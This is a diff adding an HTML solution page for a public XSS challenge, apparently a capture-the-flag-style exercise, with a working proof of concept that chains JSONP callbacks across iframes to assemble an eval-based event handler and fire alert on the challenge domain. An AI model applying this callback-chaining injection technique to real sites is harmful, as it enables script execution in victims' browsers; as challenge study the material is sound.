@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS Challenge 2020-06 | Solution</title>
+    <meta charset="utf-8">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="terjanq">
+    <meta name="twitter:title" content="XSS Challenge 2020-06">
+    <meta name="twitter:description" content="Solution to Twitter challenge">
+    <meta name="twitter:image" content="https://i.imgur.com/e0eE9RX.png">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/night-owl.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/markdown-it/11.0.0/markdown-it.min.js"></script>
+    <link rel="preload" as="image" href="bg.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="misc.js"></script>
+   </head>
+
+<body>
+    <div id=intro class=window>
+        <span class=title>Intro</span>
+        <h1> Solution to <a target="_blank" href="https://vulnerabledoma.in/xss_2020-06/">XSS Challenge 2020-06</a>
+            using 7 characters only. </h1>
+        <p>
+
+        <h2 class=subtitle>By <a target="_blank" href="https://twitter.com/@lbherrera_">@lbherrera_</a>
+            and <a target="_blank" href="https://twitter.com/@terjanq">@terjanq</a> </h2>
+        </p>
+        <h2>The challenge</h2>
+        <details>
+            <summary>check_code.php (source)</summary>
+            <pre><code class="language-php" id="codePHP"></code></pre>
+        </details>
+        <details>
+            <summary>index.html (source)</summary>
+            <pre><code class="language-html" id="codeHTML"></code></pre>
+        </details>
+        <h2>Writeup</h2>
+        <details>
+            <summary>writeup.md</summary>
+            <pre><code class="language-md" id="codeWrite"></code></pre>
+        </details>
+    </div>
+
+    <div class=window>
+        <span class=title>Proof of Concept</span>
+        <pre class=main><code id=code class="language-html"></code></pre>
+    </div>
+
+    <div id=solution>
+
+        <!-- IframeA -->
+        <iframe id="iframeA"
+            name="onmessage=e=>e.data.time?alert(`${document.domain} | Took ${e.data.time} seconds`):0">
+        </iframe>
+
+        <!-- IframeB -->
+        <iframe id="iframeB" name="b">
+        </iframe>
+
+        <script>
+            /* writes an iframe to DOM, then removes it */
+
+            const writeToIframe = async (payload, callback) => {
+                return new Promise((resolve) => {
+                    console.log(payload.length);
+                    let iframe = document.createElement("iframe");
+
+                    iframe.src =
+                        `https://vulnerabledoma.in/xss_2020-06/?code=${payload}%26callback=${callback}`;
+                    iframe.onload = async () => {
+                        iframe.remove();
+                        resolve(true);
+                    }
+                    document.body.appendChild(iframe);
+                });
+            }
+
+            /* Preloades iframes so craftIframeA and craftIframeB will load faster */
+
+            const preloadIframes = async () => {
+
+                const promises = [
+                    new Promise(r => {
+                        iframeA.src = 'https://vulnerabledoma.in/xss_2020-06/check_code.php'
+                        iframeA.onload = r
+                    }),
+                    new Promise(r => {
+                        iframeB.src = 'https://vulnerabledoma.in/xss_2020-06/check_code.php'
+                        iframeB.onload = r;
+                    })
+                ]
+
+                return Promise.all(promises);
+            }
+
+            /* 
+             *  writes to Iframe the following payload to oncut event
+             *    oncut="'Invalid';eval('Invalid'?top[0|'Invalid'].name:'Invalid')">
+             */
+
+            const craftIframe = async () => {
+                await writeToIframe(`<i x=`, "top.b.document.write");
+                await writeToIframe(`oncut="`, "top.b.document.write");
+                await writeToIframe(`;eval(`, "top.b.document.write");
+                await writeToIframe(`?top[0|`, "top.b.document.write");
+                await writeToIframe(`].name:`, "top.b.document.write");
+                await writeToIframe(`)">`, "top.b.document.write");
+
+                /* calls oncut events to imitate user interaction */
+                await writeToIframe(`1337`, "top.b.document.body.firstElementChild.oncut");
+
+            }
+
+
+            window.addEventListener(`load`, async _ => {
+                start = performance.now();
+                await preloadIframes();
+                await craftIframe();
+                let time = ((performance.now() - start) / 1000).toFixed(2);
+                b.postMessage({ time }, '*');
+            });
+        </script>
+
+    </div>
+
+
+
+</body>
+
+</html>
